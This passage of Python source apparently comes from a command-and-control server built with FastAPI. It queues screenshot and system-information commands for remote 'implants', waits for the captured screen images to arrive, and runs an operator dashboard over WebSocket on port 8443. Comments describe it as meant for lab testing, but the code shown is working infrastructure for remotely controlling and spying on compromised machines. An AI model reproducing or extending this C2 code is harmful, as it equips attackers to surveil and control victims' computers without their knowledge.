                    c2_server.pending_commands[data["implant_id"]] = {
                        "type": "sys_info"
                    }
                    
                    await websocket.send_json({
                        "type": "alert",
                        "alert_type": "success",
                        "message": "System info request sent"
                    })
                
            except asyncio.TimeoutError:
                logging.warning(f"Connection timeout for {username}, closing connection")
                # Timeout means the connection is dead, close and exit loop
                await websocket.close(code=1000, reason="Connection timeout")
                break
            except json.JSONDecodeError:
                logging.error(f"Invalid JSON received from {username}")
                await websocket.send_json({
                    "type": "alert",
                    "alert_type": "error",
                    "message": "Invalid command format"
                })
                continue
            except WebSocketDisconnect:
                logging.info(f"WebSocket disconnected for {username}")
                break

    except (WebSocketDisconnect, asyncio.TimeoutError):
        logging.info(f"Dashboard client disconnected: {username if 'username' in locals() else 'unknown'}")
    except Exception as e:
        logging.error(f"Dashboard WebSocket error: {e}")
    finally:
        # Always clean up connections
        if websocket in c2_server.dashboard_connections:
            c2_server.dashboard_connections.remove(websocket)
        try:
            await websocket.close()
        except Exception:
            pass
        
        # Always cancel the heartbeat task when disconnecting
        if heartbeat_task:
            heartbeat_task.cancel()
            try:
                await heartbeat_task
            except asyncio.CancelledError:
                pass
            logging.info(f"Heartbeat task for {username if 'username' in locals() else 'unknown'} cancelled")

@app.post("/api/implants/{implant_id}/screenshot")
async def capture_screenshot(implant_id: str, token: str = Depends(auth.oauth2_scheme)):
    """HTTP fallback for capturing screenshots when WebSocket is unavailable"""
    logging.info(f"HTTP screenshot request for implant: {implant_id}")
    
    # Validate user - Use the correct auth function
    try:
        # Create a session to pass to get_current_user
        db = next(auth.get_db())
        
        # Validate token using the existing function
        current_user = await auth.get_current_user(token, db)
        
        if not current_user:
            raise HTTPException(status_code=401, detail="Invalid authentication credentials")
    except Exception as e:
        logging.error(f"Authentication error in screenshot endpoint: {str(e)}")
        raise HTTPException(status_code=401, detail="Authentication failed")
    
    # Check if implant exists and is active
    session = get_db_session()
    try:
        implant = session.query(models.Implant).filter(models.Implant.id == implant_id).first()
        if not implant:
            raise HTTPException(status_code=404, detail="Implant not found")
        
        # Check if implant is active (last seen within 5 minutes)
        if (datetime.now() - implant.last_seen).total_seconds() > 300:
            raise HTTPException(status_code=400, detail="Implant is not active")
    finally:
        session.close()
    
    # Generate a unique request ID for this screenshot request
    request_id = secrets.token_hex(8)
    
    # Queue screenshot command with the unique request ID
    c2_server.pending_commands[implant_id] = {
        "type": "screenshot",
        "request_id": request_id  # Add request ID to track this specific request
    }
    
    # Add debug logging
    logging.info(f"Queued screenshot command for implant {implant_id} with request_id {request_id}")
    logging.info(f"Current pending commands: {c2_server.pending_commands}")
    
    # Create a dedicated response dictionary for just this request
    current_request_responses = {}
    c2_server.responses[request_id] = current_request_responses
    
    # Wait for response (with timeout)
    start_time = time.time()
    timeout = 20  # seconds - increased for more reliability
    
    logging.info(f"Starting to wait for screenshot response from implant {implant_id}")
    
    # Check for pre-existing responses first
    logging.info(f"Checking for existing screenshot responses for implant {implant_id}")
    for response_id, response_data in list(c2_server.responses.items()):
        # Skip if this is a pending request
        if response_data.get("pending", False):
            continue
            
        # Check if this is an existing screenshot for our implant
        if (response_data.get("implant_id") == implant_id and 
            response_data.get("type") == "screenshot" and
            "image_data" in response_data and
            (time.time() - response_data.get("timestamp", 0)) < 10):  # Only use recent screenshots
            
            logging.info(f"Found recent existing screenshot response for implant {implant_id}")
            
            # Get the data and remove from responses
            result = {
                "image_data": response_data["image_data"],
                "format": response_data.get("format", "jpeg"),
                "width": response_data.get("width", 1920),
                "height": response_data.get("height", 1080)
            }
            
            # Remove from responses dictionary to clean up
            try:
                del c2_server.responses[response_id]
                logging.info(f"Deleted response with ID {response_id}")
            except Exception as e:
                logging.warning(f"Could not delete response {response_id}: {str(e)}")
            
            # Return the screenshot data
            logging.info(f"HTTP screenshot for {implant_id} successful (using existing)")
            return result
    
    # Keep checking for new responses while we wait
    while time.time() - start_time < timeout:
        # Check if we have received a screenshot response that matches our request
        for response_id, response_data in list(c2_server.responses.items()):
            # Skip if this is our own pending request
            if response_id == request_id and response_data.get("pending", False):
                continue
                
            logging.info(f"Checking response {response_id}: {response_data.get('type')} for implant {response_data.get('implant_id')}")
            
            # Check if this response is for our implant and is a screenshot
            if (response_data.get("implant_id") == implant_id and 
                response_data.get("type") == "screenshot" and
                "image_data" in response_data):
                
                logging.info(f"Found matching screenshot response for implant {implant_id}")
                
                # Get the data and remove from responses
                result = {
                    "image_data": response_data["image_data"],
                    "format": response_data.get("format", "jpeg"),
                    "width": response_data.get("width", 1920),
                    "height": response_data.get("height", 1080)
                }
                
                # Remove from responses dictionary to clean up
                try:
                    del c2_server.responses[response_id]
                    logging.info(f"Deleted response with ID {response_id}")
                    
                    # Also clean up our pending request entry if it exists
                    if request_id in c2_server.responses:
                        del c2_server.responses[request_id]
                        logging.info(f"Deleted pending request with ID {request_id}")
                except Exception as e:
                    logging.warning(f"Could not delete response {response_id}: {str(e)}")
                
                # Return the screenshot data
                logging.info(f"HTTP screenshot for {implant_id} successful")
                return result
        
        # Wait a bit before checking again
        await asyncio.sleep(0.5)
    
    # If we get here, timeout occurred
    logging.error(f"HTTP screenshot request for {implant_id} timed out")
    logging.error(f"Final state of responses: {c2_server.responses}")
    
    # Handle the timeout more gracefully - return a specific error
    return JSONResponse(
        status_code=504,
        content={
            "error": "Screenshot request timed out",
            "implant_id": implant_id,
            "message": "The implant did not respond with a screenshot in time."
        }
    )

@app.get("/api/diagnostics/websocket")
async def websocket_diagnostics(token: str = Depends(auth.oauth2_scheme)):
    """
    Provides diagnostic information about the WebSocket server.
    """
    try:
        # Validate the token
        user = auth.verify_token(token)
        if not user:
            return JSONResponse(
                status_code=401,
                content={"error": "Invalid authentication token"}
            )

        # Get current time
        current_time = time.time()
        
        # Get dashboard WebSocket connections
        dashboard_connections = len(manager.active_connections)
        
        # Get implant connections (estimated from active implants with recent activity)
        implants = c2_server.get_active_implants()
        client_connections = len([i for i in implants if i.get('status') == 'online'])
        
        # Get server uptime (in seconds)
        server_uptime = current_time - c2_server.start_time
        
        return {
            "status": "online",
            "dashboard_connections": dashboard_connections,
            "client_connections": client_connections,
            "server_uptime": server_uptime,
            "timestamp": current_time
        }
    except Exception as e:
        # Log the error
        print(f"Error in websocket_diagnostics: {str(e)}")
        
        # Return a graceful error instead of 500
        return {
            "status": "error",
            "error_message": str(e),
            "timestamp": time.time()
        }

if __name__ == "__main__":
    # SSL context for secure local development
    ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ssl_context.load_cert_chain(
        certfile="server.crt",
        keyfile="server.key"
    )
    ssl_context.verify_mode = ssl.CERT_NONE  # For local development only
    
    # Run with SSL for secure lab testing
    uvicorn.run(
        app, 
        host="0.0.0.0",  # Changed from 127.0.0.1 to 0.0.0.0
        port=8443,  # Using a non-privileged port
        ssl_keyfile="server.key",
        ssl_certfile="server.crt",
        ssl_version=ssl.PROTOCOL_TLS,  # Use the most secure protocol available
        workers=1  # Single worker to ensure WebSocket connections are handled properly
    ) 